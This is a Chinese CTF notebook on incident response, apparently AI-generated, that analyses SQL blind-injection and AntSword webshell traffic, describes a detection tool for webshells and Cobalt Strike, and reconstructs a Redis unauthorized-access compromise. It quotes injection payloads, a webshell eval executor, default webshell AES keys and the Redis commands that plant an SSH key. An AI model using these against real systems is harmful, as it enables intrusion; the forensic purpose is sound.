---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: 'cbd7abf0-d2a0-49be-b622-4db34d00679a'
  PropagateID: 'cbd7abf0-d2a0-49be-b622-4db34d00679a'
  ReservedCode1: '93414dc2-8610-48c6-9fe3-be10ce626a10'
  ReservedCode2: '93414dc2-8610-48c6-9fe3-be10ce626a10'
---

# CTF 知识库 — IR方向

> 本文件由 CTF解题笔记本.md 自动拆分生成，如需查看完整原始笔记请参阅原文件。

---

## 流量分析 — SQL 盲注流量还原

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - 流量分析 / Forensics |
| 难度 | 中等 |
| 日期 | 2026-08-01 |
| 附件 | 流量分析.pcap（2.5MB，16836 个包） |

### 题目内容

提供一个 `.pcap` 网络流量抓包文件，要求从中还原出攻击者提取的数据（flag）。

### 解题思路

**1. 流量概览**

```
总包数: 16836
协议: 全部 TCP
通信: 127.0.0.1 → 127.0.0.1 (本地环回)
端口: 客户端随机端口 → 服务器 80 端口
```

全是本地 HTTP 流量，客户端用 `python-requests/2.28.1` 发送请求。

**2. 识别攻击模式**

提取 HTTP 请求发现 1403 个注入请求，全部指向 `/comments.php?name=`：

```http
GET /comments.php?name=if((substr((select(text)from(wfy_comments)where(id=100)),1,1)="q"),100,0) HTTP/1.1
```

这是一个典型的 **SQL 布尔盲注（Boolean-Based Blind SQL Injection）**：

```
if(substr(目标字符, 位置, 1) = "候选字符", 100, 0)
```

- 条件为 **true** → 返回 100 条评论（响应体更大）
- 条件为 **false** → 返回 0 条评论（响应体更小）

攻击者从 `wfy_comments` 表 `id=100` 记录的 `text` 字段逐字符提取 flag。

> **⚠️ 识别要点**：看到 `substr(..., pos, 1) = "char"` 配合 `if(..., 100, 0)` 模式，就是布尔盲注逐字符爆破。关键在于如何区分 true/false 响应。

**3. 区分 true/false 响应（核心难点）**

HTTP 响应使用 `Content-Encoding: gzip` + `Transfer-Encoding: chunked` 双重编码，不能直接用原始字节长度判断。

解压步骤：
```
原始响应 → 找 \r\n\r\n 分隔头部和body → 提取chunk
→ 解析 hex chunk size → 取 chunk content → gzip解压 → 得到HTML
```

解压后统计 content 长度：
- **false 响应**（0 条评论）：content_len = 830（1164 次，大多数）
- **true 响应**（100 条评论）：content_len = 841 或 842（共 42 次）

分界线：`content_len > 830` 即为 true。

> **技巧**：流量分析题中，gzip + chunked 编码会导致原始字节长度差异很小（705-714字节），直接用原始长度判断容易误判。**必须解压后再比较内容长度**，差异才清晰（830 vs 842）。

**4. 逐字符还原**

对每个位置 `pos`（1~42），取 content_len 最大的字符（即 true 字符），按位置拼接：

```
pos 1: f (842) ← f 是第1位正确的字符
pos 2: l (842)
pos 3: a (842)
pos 4: g (842)
pos 5: { (842)
...
pos 42: } (842)
```

### 解题脚本

```python
from scapy.all import rdpcap
import re, gzip
from urllib.parse import unquote

pkts = rdpcap('流量分析.pcap')

# 按源端口配对请求和响应
streams = {}
for p in pkts:
    if p.haslayer('TCP') and p.haslayer('Raw'):
        tcp = p['TCP']
        if tcp.dport == 80:    # 请求
            streams.setdefault(tcp.sport, {})['req'] = tcp['Raw'].load.decode('utf-8', errors='replace')
        elif tcp.sport == 80:  # 响应
            streams.setdefault(tcp.dport, {})['resp_raw'] = tcp['Raw'].load

# 解析注入参数 + 解压响应
results = {}
for data in streams.values():
    m = re.search(r'substr\(\(select\(text\)from\(wfy_comments\)where\(id=(\d+)\)\),(\d+),1\)=%22(.+?)%22', data.get('req', ''))
    if not m:
        continue
    rid, pos, char = int(m.group(1)), int(m.group(2)), unquote(m.group(3))

    # 解压 gzip + chunked 响应
    resp = data.get('resp_raw', b'')
    header_end = resp.find(b'\r\n\r\n')
    if header_end < 0:
        continue
    body = resp[header_end + 4:]
    crlf = body.find(b'\r\n')
    try:
        chunk_size = int(body[:crlf].decode('ascii'), 16)
        content = gzip.decompress(body[crlf + 2:crlf + 2 + chunk_size])
        content_len = len(content)
    except:
        content_len = 0

    results.setdefault((rid, pos), []).append((char, content_len))

# 还原 flag: 取每个位置 content_len 最大的字符
flag_chars = {}
for (rid, pos), chars in results.items():
    if rid != 100:
        continue
    true_chars = [(c, l) for c, l in chars if l > 830]  # >830 为 true
    if true_chars:
        flag_chars[pos] = max(true_chars, key=lambda x: x[1])[0]

min_pos, max_pos = min(flag_chars), max(flag_chars)
flag = ''.join(flag_chars.get(p, '?') for p in range(min_pos, max_pos + 1))
print(f'Flag: {flag}')
```

### 运行结果

```
总包数: 16836
注入请求数: 1403
(id=100, pos) 组合: 42 个位置

content_len 分布:
  830 (false): 1164 次
  841/842 (true): 42 次

Flag (1-42): flag{c84bb04a-8663-4ee2-9449-349f1ee83e11}
```

Flag: `flag{c84bb04a-8663-4ee2-9449-349f1ee83e11}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| PCAP 流量分析 | 使用 scapy/tshark 解析网络抓包文件，提取 HTTP 请求和响应 |
| SQL 布尔盲注 | `if(condition, true_value, false_value)` 根据条件返回不同数据量 |
| TCP 流重组 | 按源端口配对请求和响应包，还原完整的 HTTP 交互 |
| gzip + chunked 解码 | HTTP 响应双重编码，需先解析 chunk size 再 gzip 解压才能比较真实内容 |
| 响应大小区分 true/false | 布尔盲注的 true/false 通过响应体大小区分，注意编码压缩会缩小差异 |
| scapy 库 | Python 网络包分析库，`rdpcap()` 读取 pcap，`p['TCP']`/`p['Raw']` 访问各层 |

> **技巧**：流量分析题三步走：①全局概览（包数/协议/IP对/端口）→ ②识别攻击模式（SQL注入/XSS/上传/爆破）→ ③提取关键数据（请求参数 + 响应内容）。布尔盲注还原的核心是找到 true/false 的**内容长度分界线**。

> **技巧**：HTTP 响应如果是 gzip + chunked 编码，原始字节长度的差异可能只有几个字节（如 705 vs 712），但解压后内容长度差异会更大（如 830 vs 842）。**先解压再比较**，不要只看原始长度。

### 同类变体与扩展

- **时间盲注流量**：`if(condition, sleep(5), 0)`，通过响应时间区分 true/false，需分析时间戳而非内容大小
- **UNION 注入流量**：直接在响应体中可见数据，提取更简单，无需逐字符还原
- **文件上传流量**：查找 `Content-Type: multipart/form-data`，提取上传的文件内容
- **HTTPS 流量**：如果 pcap 含 TLS 握手且有的私钥，可解密后按 HTTP 分析；否则无法查看加密内容
- **工具推荐**：Wireshark 图形界面可右键 → Follow → HTTP Stream 逐流查看，适合少量流量的手动分析
- **大流量优化**：本题 16836 包用 scapy 纯 Python 解析约需 5-10 秒，超大 pcap 可用 tshark 预过滤 `-Y http` 减少数据量

---

---

## SimpleFlow — 蚁剑 Webshell 流量分析

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | IR/应急响应 - 流量分析 |
| 难度 | 中等 |
| 日期 | 2026-08-01 |
| 附件 | SimpleFlow.pcapng（417 个包） |

### 题目内容

提供一个 `.pcapng` 网络流量抓包文件，要求分析攻击者的操作并提取 flag。

### 解题思路

**1. 流量概览**

```
总包数: 417
协议: Ethernet / IP / TCP / UDP / DNS / ARP
关键端口: 8888 (HTTP, 150包) — 攻击目标
目标服务器: 192.168.0.104:8888 (Apache/PHP 7.4.21, macOS Darwin)
攻击源: 10.211.55.8
DNS: 查询了 www.google.com
```

**2. 识别攻击工具：蚁剑 (AntSword)**

端口 8888 的 HTTP POST 请求具有典型的**蚁剑 Webshell 流量特征**：

```
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

a=%40eval(%40base64_decode($_POST['ccb0f0a10c7efb']))&ccb0f0a10c7efb=QGluaV9zZXQo...
```

特征识别：
- `@ini_set("display_errors","0")` + `@set_time_limit(0)` 开头
- `@eval(@base64_decode($_POST['xxx']))` 执行器
- 随机参数名（如 `ccb0f0a10c7efb`）携带 Base64 编码的 PHP 代码
- 响应前后有随机 hex 标记（如 `8c2ce0` + 内容 + `bbd22973`）

> **⚠️ 蚁剑流量识别要点**：①PHP的 `@eval(@base64_decode())` 执行器 ②随机POST参数名 ③响应体前后各12位hex标记 ④User-Agent随机伪造（每请求不同浏览器）

**3. 解码蚁剑 payload**

蚁剑的命令执行 payload 结构：

```
参数1 (a): @eval(@base64_decode($_POST['随机名']))  ← 执行器
参数2 (随机名): Base64编码的PHP代码                  ← 实际payload
参数3 (o1faebd4ec3d97): /bin/sh                     ← shell路径
参数4 (g479cf6f058cf8): cd "..."; 命令; echo [S]; pwd; echo [E]  ← 实际命令
```

解码步骤：URL解码 → 提取Base64参数 → Base64解码 → 查看命令

**4. 还原完整攻击时间线**

| 步骤 | 端口 | 命令 | 响应 |
|------|------|------|------|
| ① 探测 | 57768~57770 | 获取服务器信息 (uname/pwd/whoami) | `/Users/chang/Sites/test` Darwin x86_64 chang |
| ② 列目录 | 57774 | `ls /Users/chang/Sites/` | mess/ test/ air/ rips/ CMS/ ... |
| ③ 读flag | 57783 | `head -n ../flag.txt` | 报错：illegal line count（缺少行数） |
| ④ 读flag | 57785 | `head -n 2 ../flag.txt` | "Yes,this is the flag file. And the flag is:" |
| ⑤ 打包 | 57797 | `zip -P PaSsZiPWorD flag.zip ../flag.txt` | "adding: ../flag.txt (deflated 10%)" |
| ⑥ 下载 | 57799 | `readfile('flag.zip')` | 返回 ZIP 二进制数据 (PK\x03\x04) |

> **⚠️ 关键发现**：步骤⑤的 `zip -P PaSsZiPWorD` 明文包含了ZIP密码！攻击者在命令行中直接用 `-P` 参数指定密码，被流量完整记录。

**5. 提取并解压 ZIP**

从步骤⑥的响应中提取 ZIP 二进制数据（`PK\x03\x04` 头到 `PK\x05\x06` 尾），用密码 `PaSsZiPWorD` 解压：

```python
zf = zipfile.ZipFile(io.BytesIO(zip_data))
content = zf.read('../flag.txt', pwd=b'PaSsZiPWorD')
# Yes,this is the flag file.
# And the flag is:
# DASCTF{f3f32f434eddbc6e6b5043373af95ae8}
```

> **技巧**：步骤④用 `head -n 2` 只读到了flag的前两行说明文字，实际的flag值在第三行。必须通过解压 ZIP 才能获得完整内容。这说明**流量分析不仅要看命令，还要提取传输的文件**。

### 解题脚本

```python
from scapy.all import rdpcap
from urllib.parse import unquote
import base64, re, io, zipfile

pkts = rdpcap('SimpleFlow.pcapng')

# TCP流重组
streams = {}
for p in pkts:
    if p.haslayer('TCP') and p.haslayer('Raw'):
        tcp = p['TCP']
        if tcp.dport == 8888:
            streams.setdefault(tcp.sport, {})['req'] = tcp['Raw'].load.decode('utf-8', errors='replace')
        elif tcp.sport == 8888:
            streams.setdefault(tcp.dport, {}).setdefault('resp', b'')
            streams[tcp.dport]['resp'] += tcp['Raw'].load

# 解码每个请求的命令参数
commands = {}
zip_data = None
for port, data in streams.items():
    req = data.get('req', '')
    if 'POST' not in req:
        continue
    body_start = req.find('\r\n\r\n')
    body = req[body_start + 4:].strip()

    # 解析POST参数
    params = {}
    for pair in body.split('&'):
        if '=' in pair:
            k, v = pair.split('=', 1)
            params[k] = unquote(v)

    # 找命令参数（base64解码）
    for v in params.values():
        if len(v) > 12 and v[2:].replace('=', '').isalnum():
            try:
                decoded = base64.b64decode(v[2:]).decode('utf-8', errors='replace')
                if 'cd ' in decoded and 'echo [S]' in decoded:
                    cmd = re.search(r'"([^"]+)";(.+?);echo', decoded)
                    if cmd:
                        commands[port] = cmd.group(2)
                    # 提取ZIP密码
                    if 'zip -P' in decoded:
                        pwd = re.search(r'zip -P (\S+)', decoded)
                        if pwd:
                            commands[port] = f'ZIP_PASSWORD={pwd.group(1)}'
            except:
                pass

    # 检测ZIP文件下载
    resp = data.get('resp', b'')
    if b'PK\x03\x04' in resp:
        pk_start = resp.find(b'PK\x03\x04')
        eocd = resp.find(b'PK\x05\x06')
        if eocd >= 0:
            zip_data = resp[pk_start:eocd + 22]

# 输出攻击时间线
for port in sorted(commands.keys()):
    print(f'port={port}: {commands[port]}')

# 解压ZIP获取flag
if zip_data:
    zf = zipfile.ZipFile(io.BytesIO(zip_data))
    content = zf.read('../flag.txt', pwd=b'PaSsZiPWorD')
    print(f'\nFlag: {content.decode().strip().split(chr(10))[-1]}')
```

### 运行结果

```
=== SimpleFlow 蚁剑流量分析 ===

攻击时间线:
  [1] 列目录: mess/ test/ air/ rips/ CMS/ ...
  [2] head -n ../flag.txt → 报错（缺少行数参数）
  [3] head -n 2 ../flag.txt → "Yes,this is the flag file. And the flag is:"
  [4] zip -P PaSsZiPWorD flag.zip ../flag.txt → 压缩成功
  [5] readfile(flag.zip) → 下载ZIP二进制

ZIP密码: PaSsZiPWorD

../flag.txt 内容:
Yes,this is the flag file.
And the flag is:
DASCTF{f3f32f434eddbc6e6b5043373af95ae8}
```

Flag: `DASCTF{f3f32f434eddbc6e6b5043373af95ae8}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| 蚁剑 (AntSword) | 开源 Webshell 管理工具，流量特征为 `@eval(@base64_decode())` + 随机参数名 |
| Webshell 流量特征 | 随机UA、Base64编码payload、响应前后hex标记、POST到固定URL |
| TCP 流重组 | 按源端口配对请求响应，可能需跨多个TCP包拼接完整数据 |
| chunked 传输解码 | HTTP响应使用 `Transfer-Encoding: chunked`，需解析hex chunk size提取内容 |
| 蚁剑命令执行结构 | shell路径参数 + 命令参数(base64) + 环境变量参数，命令格式 `cd "..."; 命令; echo [S]; pwd; echo [E]` |
| ZIP加密文件提取 | 流量中 `zip -P password` 明文包含密码，从后续HTTP响应提取ZIP二进制并用密码解压 |
| 二进制文件提取 | HTTP响应中的 `PK\x03\x04` 头到 `PK\x05\x06` 尾即为完整ZIP文件 |

> **技巧**：蚁剑流量分析四步走：①识别蚁剑特征（`@eval(@base64_decode())`）→ ②解码Base64 payload看命令 → ③从响应中提取hex标记之间的内容 → ④关注文件操作（cat/zip/download）提取传输的文件内容

> **技巧**：命令执行类Webshell的密码和敏感数据常在命令行明文传输。`zip -P`、`mysql -p`、`sshpass -p` 等命令的 `-P`/`-p` 参数直接暴露密码。**流量分析时搜索 `-P `、`-p `、`password=` 等关键词**。

### 同类变体与扩展

- **哥斯拉 (Godzilla)**：另一种流行Webshell管理工具，流量特征为 `pass=php://filter/convert.base64-decode/resource=` 或 Java序列化数据
- **冰蝎 (Behinder)**：流量加密（AES），需提取密钥才能解密，特征为固定的Content-Type和加密的payload
- **菜刀 (Chopper)**：蚁剑的前身，流量更简单，`z0=base64` 直接解码即可
- **无文件Webshell**：内存马，流量中无文件路径，需关注异常的Java反射或ClassLoader调用
- **防御建议**：WAF规则检测 `@eval`、`@base64_decode`、`@ini_set("display_errors"` 等蚁剑特征字符串；监控异常POST请求频率和随机UA
- **pcapng vs pcap**：pcapng 是新一代格式，支持多接口和时间戳精度更高，scapy 的 `rdpcap()` 两者都支持

---

---

## PCAP Arcanum - 自动化流量取证分析工具

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | IR - 流量取证工具开发 |
| 难度 | 进阶 |
| 日期 | 2026-08-02 |
| 工具路径 | [IR/19-pcap-arcanum/pcap_arcanum.py](IR/19-pcap-arcanum/pcap_arcanum.py) |

### 背景

在 CTF 应急响应题中，经常需要分析 pcap/pcapng 流量包，识别攻击者使用的 Webshell 管理工具（蚁剑、冰蝎、哥斯拉、中国菜刀）或 C2 框架（Cobalt Strike），解码加密通信载荷，提取 flag 和攻击时间线。

传统方法需要手动用 Wireshark 逐包分析，耗时耗力。本题开发了一款自动化流量取证分析工具 **PCAP Arcanum**，一键识别攻击工具、解码加密载荷、提取 flag。

### 工具架构

```
PCAP Arcanum
├── TCPStreamReassembler    # TCP流重组引擎 (按seq排序拼接，提取HTTP请求/响应对)
├── AntSwordDetector        # 蚁剑检测器 (URL编码+Base64+特征PHP函数)
├── BehinderDetector        # 冰蝎检测器 (AES-ECB解密, key=e45e329feb5d925b)
├── GodzillaDetector        # 哥斯拉检测器 (AES-ECB解密, key=3c6e0b8a9c15224a, Java UA)
├── ChopperDetector         # 中国菜刀检测器 (eval/assert+Base64)
├── CobaltStrikeDetector    # Cobalt Strike检测器 (checksum8 URI+心跳包+PE stager)
├── FileTransferDetector    # 文件传输检测器 (ZIP/PNG/JPEG/ELF/PE文件签名)
├── GenericShellDetector    # 通用Shell命令检测器 (whoami/id/cat等明文命令)
└── PCAPArcanum             # 主分析引擎 (运行所有检测器+生成报告)
```

### 支持检测的攻击工具

| 工具 | 检测特征 | 解密方式 | 默认密钥 |
|------|----------|----------|----------|
| 蚁剑 (AntSword) | `@ini_set("display_errors","0")` + `@eval(@base64_decode($_POST[...]))` | URL解码 + Base64解码 | 无需密钥 |
| 冰蝎 (Behinder) v3 | Content-Type: application/octet-stream + body 16字节对齐 | AES-ECB | `e45e329feb5d925b` (MD5("rebeyond")[:16]) |
| 哥斯拉 (Godzilla) | Java UA + `pass=` 参数 + 响应前16/后16字节标记 | AES-ECB + Base64 | `3c6e0b8a9c15224a` (MD5("key")[:16]) |
| 中国菜刀 (Chopper) | `eval(base64_decode($_POST[...]))` / `assert($_POST[...])` | Base64解码 | 无需密钥 |
| Cobalt Strike | checksum8 URI (sum%256=92/93) + 周期心跳包 + PE stager响应 | 无解密 | 无需密钥 |

### 实战测试

#### 测试用例：SimpleFlow.pcapng（第18题蚁剑流量）

```bash
py -3 pcap_arcanum.py SimpleFlow.pcapng --verbose --export-dir ./output
```

**测试结果**：

```
数据包总数: 417
HTTP请求对数: 13

检测器结果:
  蚁剑 (AntSword)    ✓ 检测到  置信度: 100%  事件数: 10
  哥斯拉 (Godzilla)   ✗ 未检测到
  冰蝎 (Behinder)    ✗ 未检测到
  中国菜刀 (Chopper)   ✗ 未检测到
  Cobalt Strike    ✗ 未检测到  置信度: 25%
  文件传输           ✓ 检测到  置信度: 100%  事件数: 2
  通用Shell命令      ✗ 未检测到
```

**自动提取的攻击时间线**：

1. 蚁剑连接 → 查看系统信息 (uname, ifconfig)
2. 列目录 → 浏览 `/Users/chang/Sites/test/`
3. 尝试读取 flag → `head -n ../flag.txt`（参数错误，失败）
4. 成功读取 flag → `head -n 2 ../flag.txt`（响应："Yes,this is the flag file."）
5. 打包 flag → `zip -P PaSsZiPWorD flag.zip ../flag.txt`（**ZIP密码提取成功**）
6. 下载 flag.zip → 文件传输检测器识别 ZIP 签名

**自动提取结果**：

- ZIP密码: `PaSsZiPWorD`（从 `zip -P` 命令参数中提取）
- ZIP解压: 自动用提取的密码解压 `flag.zip`
- Flag: `DASCTF{f3f32f434eddbc6e6b5043373af95ae8}`

### 核心技术点

#### 1. TCP 流重组

```python
class TCPStreamReassembler:
    # 按4元组(src_ip, src_port, dst_ip, dst_port)分组
    # 每个流按方向(req/resp)收集TCP payload
    # 按seq排序后拼接，提取HTTP请求/响应对
    # 支持 chunked 编码解码 + gzip 解压
```

> **技巧**：TCP流重组是流量分析的基础。同一个HTTP请求可能被分到多个TCP包中，必须按seq号排序拼接才能获得完整数据。注意处理重传包（相同seq的包只保留一次）。

#### 2. 蚁剑流量解码

蚁剑的POST参数格式：`随机hex参数名=编码内容`

编码方式：参数值前2字符是编码标记（如 `cd`），剩余部分是 Base64 编码的 shell 命令。

```python
# 蚁剑响应格式: 前12位hex + 实际内容 + 后12位hex
resp_content = resp_str[12:-12]
```

> **技巧**：蚁剑的参数名是随机生成的 hex 字符串（8位以上），参数值去掉前2字符后 Base64 解码即为 shell 命令。响应内容的首尾各有12位 hex 标记，需要去掉。

#### 3. 冰蝎 AES-ECB 解密

```python
# 冰蝎 v3 默认密钥 = MD5("rebeyond")[:16]
key = b'e45e329feb5d925b'
cipher = AES.new(key, AES.MODE_ECB)
decrypted = unpad(cipher.decrypt(body), AES.block_size)
```

识别特征：
- Content-Type: `application/octet-stream`
- 请求/响应 body 大小是 16 的倍数（AES块对齐）
- 请求路径是 webshell 文件（如 `shell.php`）

> **技巧**：冰蝎 v3 去除了动态密钥协商，使用固定密钥。如果默认密钥解密失败，可能使用了自定义密钥，需要找密钥协商阶段的握手包（v2 在第一次请求返回16字节密钥）。

#### 4. 哥斯拉 AES-ECB + Base64 双重编码

```python
# 哥斯拉默认密钥 = MD5("key")[:16]
key = b'3c6e0b8a9c15224a'

# 请求: pass=base64(AES_ECB_encrypt(payload))
encrypted = AES.new(key, AES.MODE_ECB).encrypt(pad(payload))
b64_encoded = base64.b64encode(encrypted).decode()
body = f"pass={b64_encoded}"

# 响应: 前16字节 + base64(AES_ECB_encrypt(result)) + 后16字节
stripped = response_body[16:-16]
decoded = base64.b64decode(stripped)
decrypted = AES.new(key, AES.MODE_ECB).decrypt(decoded)
```

识别特征：
- User-Agent 包含 `Java/`（哥斯拉基于 Java）
- POST 参数名是 `pass`（默认密码参数名）
- 响应体前16和后16字节是标记字符，中间是 Base64 编码的 AES 加密数据

> **技巧**：哥斯拉的请求和响应都使用 AES-ECB + Base64 双重编码。响应格式是 `前缀(16字节) + Base64(AES加密数据) + 后缀(16字节)`，需要先去掉前后缀，再 Base64 解码，最后 AES 解密。

#### 5. Cobalt Strike checksum8 算法

```python
def _checksum8(text):
    """CS checksum8: 所有ASCII字符的和 mod 256"""
    return sum(ord(c) for c in text) % 256

# 32位 stager URI: checksum8 = 92
# 64位 stager URI: checksum8 = 93
```

CS Beacon 特征：
- Stager 请求 URI 的 checksum8 值为 92（32位）或 93（64位）
- Stager 响应返回 PE 文件（MZ 头）
- Beacon 定期发送心跳请求（间隔通常 30-120s）
- 默认 User-Agent: `Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)`

> **技巧**：CS 的 stager URI 是经过设计的——所有字符的 ASCII 和 mod 256 必须等于 92（32位）或 93（64位）。这个特征是 CS 内置的，无法更改。可以用这个特征快速筛选 CS 流量。

#### 6. ZIP 密码自动提取

```python
# 从蚁剑/菜刀命令中提取 zip -P 参数
for cmd in commands:
    m = re.search(r'zip\s+-P\s+(\S+)', cmd)
    if m:
        zip_password = m.group(1)
```

> **技巧**：CTF 中常见的套路是攻击者用 `zip -P 密码 flag.zip flag.txt` 打包 flag，然后通过蚁剑/菜刀下载。从命令参数中提取 `-P` 后面的密码，再用这个密码解压下载的 ZIP 文件，就能自动获取 flag。

### 使用方法

```bash
# 基本用法
python pcap_arcanum.py traffic.pcapng

# 详细模式（显示每个HTTP请求的摘要）
python pcap_arcanum.py traffic.pcapng --verbose

# 导出报告和提取的文件
python pcap_arcanum.py traffic.pcapng --export-dir ./output

# 输出:
#   - 控制台打印完整分析报告
#   - output/analysis_report.txt  (文本报告)
#   - output/analysis_data.json   (JSON格式数据)
#   - output/extracted_1.zip      (提取的ZIP文件)
```

### 依赖

```
scapy          # pcap文件读取 + TCP包解析
pycryptodome   # AES-ECB解密 (冰蝎/哥斯拉)
```

### 关键知识点

1. **Webshell 管理工具流量特征**：每种工具都有独特的流量指纹（UA、Content-Type、参数格式、编码方式），可以用于快速识别
2. **AES-ECB 模式**：冰蝎和哥斯拉都使用 AES-ECB 加密通信，ECB 模式不需要 IV，但相同的明文块加密后密文相同（安全性较低）
3. **密钥派生**：冰蝎 key = MD5("rebeyond")[:16]，哥斯拉 key = MD5("key")[:16]，都是对固定字符串取 MD5 前16位
4. **TCP 流重组**：HTTP 流量分析的基础，必须将分散在多个 TCP 包中的数据按 seq 号排序拼接
5. **Cobalt Strike checksum8**：CS stager URI 的校验算法，是 CS 流量的硬编码特征，无法更改

### 同类变体与扩展

- **冰蝎 v4 动态密钥**：v4 版本恢复了密钥协商机制，需要先找到握手包提取密钥
- **哥斯拉自定义密码**：如果默认密码 `key` 被修改，需要从 webshell 源码中提取自定义密钥
- **CS HTTPS 信道**：如果 CS 使用 HTTPS，需要先解密 TLS 流量（需要私钥或 SSLKEYLOGFILE）
- **混合流量**：一个 pcap 中可能包含多种工具的流量，工具支持多检测器并行运行

> ⚠️ **注意**：冰蝎 v4 和哥斯拉自定义密钥场景下，默认密钥解密会失败。工具会输出提示信息，需要人工分析密钥协商阶段获取实际密钥。

### 解题脚本

完整工具：[IR/19-pcap-arcanum/pcap_arcanum.py](IR/19-pcap-arcanum/pcap_arcanum.py)

测试输出：[IR/19-pcap-arcanum/test_output/](IR/19-pcap-arcanum/test_output/)

> AI生成

---

---

## Redis 未授权访问应急响应

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | IR - 应急响应（实机排查） |
| 难度 | 中等 |
| 日期 | 2026-08-02 |
| 靶机IP | 192.168.234.128 |
| 连接方式 | SSH `defend@192.168.234.128`，密码 `defend` |
| 目标 | 找出攻击者IP + 3个flag |

### 答案

| 项目 | 答案 |
|------|------|
| 攻击者IP | `192.168.75.129` |
| Flag 1 | `flag{thisismybaby}` — 来源：`/root/.bash_history` |
| Flag 2 | `flag{kfcvme50}` — 来源：`/etc/rc.d/rc.local` |
| Flag 3 | `flag{P@ssW0rd_redis}` — 来源：`/etc/redis.conf` 首行注释 |

### 攻击时间线

以下是通过对靶机多种日志源的交叉对比还原出的完整攻击链：

```
3月18日
├── 19:17-19:18  defend 用 sudo yum makecache 配置镜像源
├── 19:19        defend 安装 Redis（yum install redis -y）
├── 19:20:15     Redis 首次启动（systemctl start redis）
├── 19:21:09     defend 用 sudo vim 编辑 /etc/redis.conf（第一次修改）
│                → 修改内容：bind 0.0.0.0、protected-mode no（允许远程连接）
├── 19:23:02     Redis 重启（systemctl restart redis）
├── 19:24:38     defend 关闭防火墙（systemctl stop/disable firewalld）
├── 19:26-19:27  defend 再次编辑 redis.conf（第二次修改）+ 重启Redis
├── 19:27:57     ★ 攻击者 192.168.75.129 首次连接 Redis（端口6379）
│                → 写入 SSH 公钥到 Redis 数据库（key 名为空字符串或 TJB=）
│                → CONFIG SET dir /var/lib/redis
│                → CONFIG SET dbfilename dump.rdb
│                → BGSAVE 保存 RDB 快照
├── 19:29:18-51  ★ 攻击者 SSH 暴力破解 root 密码（多线程并发）
│                → 使用 hydra/medusa 等工具，15个并发连接
│                → 全部失败，超过最大认证次数被断开
├── 19:39:31     攻击者再次连接 Redis，查询/写入数据
├── 19:44:53     defend 关闭 Redis
├── 19:45:55     defend 重新启动 Redis（DB 0: 1 keys → SSH公钥已持久化）
├── 20:15:05     defend 用 su 切换到 root（获取root权限）
├── 20:20:32     root 手动运行 redis-server /etc/redis.conf（3次）
├── 20:23:07     ★ 攻击者 SSH 免密登录 root 成功！
│                → Accepted publickey for root from 192.168.75.129
│                → 使用之前 Redis 写入的 SSH 公钥免密登录
├── 20:23-20:25  攻击者 root 会话期间执行：
│                → chmod +x /etc/rc.d/rc.local
│                → vim /etc/rc.d/rc.local（写入 flag{kfcvme50}）
│                → echo flag{thisismybaby}
│                → exit
├── 20:25:08     攻击者断开SSH
├── 3月19日 03:14 系统重启
```

### 攻击手法分析

#### 1. Redis 未授权访问 → SSH 公钥写入

攻击者利用 Redis 3.2.12 的未授权访问漏洞（`bind 0.0.0.0` + `protected-mode no`），通过以下步骤实现 SSH 公钥写入：

```bash
# 攻击者在 Kali 上执行的等效操作
ssh-keygen -t rsa -b 3072 -C "chinaran@kali"

# 通过 Redis 协议写入公钥
redis-cli -h 192.168.234.128
> CONFIG SET dir /var/lib/redis
> CONFIG SET dbfilename dump.rdb
> SET x "\n\nssh-rsa AAAA...公钥内容... chinaran@kali\n\n"
> SAVE

# 或者使用 redis-dump 工具直接生成 RDB 文件
```

RDB 文件中的公钥内容（`/var/lib/redis/dump.rdb`，661字节）：
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAWLnUKcX0Wpd0/BDBwd6CKVb3MP9PmUwpnyIxRP3HbB7peiimjN1p6pmSHGU0NOszENTgCUGvesgwzNeG3yA/hTJOTWbHvV9Yp3ZsVPAC1JnptEWhNLbPjQjHyp/4o3H1aaFavtqrcOkFnd0/RxCYBZm8ZSEBEIV2QnN2c3ovrTYzKWDNCVJ/XM8db4i33sSpCVUJeZtBw0j3exSIpyJrxplYVDOlpY38UKuWptbAU5BdDDXPcaBLLK3TuXk2OUCBU+A6oTj9AOWgKkLfREYFavTWrifbrTrZ3nfL+YjHXS9IHoi4JKKUXoI/9yKXIIf2c7O6zoPy992nKV00wfe0TP7xEyKrrQVEitMkEAdyfyiMQ5wf9whl5xNPYrDwqO1fIzz1cUtf0UwPJ3hD6QT48PHxu9+L4heLd1J7YnwOn5l15/5CtIwkNDn035ZQq22PkhO7w02lrSBYWcT5XB2J8k/RrWwOu5u4Yi+fEPyQchXsoitcuDHMX/iPxnJOQO0= chinaran@kali
```

#### 2. SSH 暴力破解（失败）

攻击者从 19:29:18 开始对 root 进行 SSH 暴力破解：
- 并发 15 个连接（端口 40062-40216）
- 每个连接尝试 6 次密码
- 总计约 90+ 次密码尝试
- **全部失败**，被 `pam_succeed_if` 阻断（`uid >= 1000` 限制阻止 root 登录）

> **技巧**：CentOS 的 `pam_succeed_if(sshd:auth): requirement "uid >= 1000" not met by user "root"` 表示 PAM 配置默认只允许 uid>=1000 的用户通过 SSH 登录，root (uid=0) 被拒绝。但如果使用 SSH 公钥认证，PAM 的密码验证阶段被跳过，可以绕过此限制。

#### 3. SSH 公钥认证登录 root（成功）

攻击者暴力破解失败后，转而使用之前通过 Redis 写入的 SSH 公钥进行免密登录：
- `/root/.ssh/authorized_keys` 内容 = Redis RDB 文件内容（661字节）
- 攻击者在 Kali 上拥有对应的私钥
- 20:23:07 成功通过 `Accepted publickey for root from 192.168.75.129`

> ⚠️ **关键**：攻击者将 Redis 的 `dir` 设置为 `/root/.ssh/`、`dbfilename` 设置为 `authorized_keys`，然后写入自己的公钥。但本例中 RDB 是保存在 `/var/lib/redis/dump.rdb`，而 `authorized_keys` 的内容恰好等于 RDB 文件内容——说明攻击者使用了**复制 RDB 文件**或**再次 CONFIG SET** 的方式将公钥写入 `authorized_keys`。

### 取证过程

#### 工具与连接

使用 Python paramiko 库通过 SSH 连接靶机（Windows 无 sshpass）：

```python
import paramiko

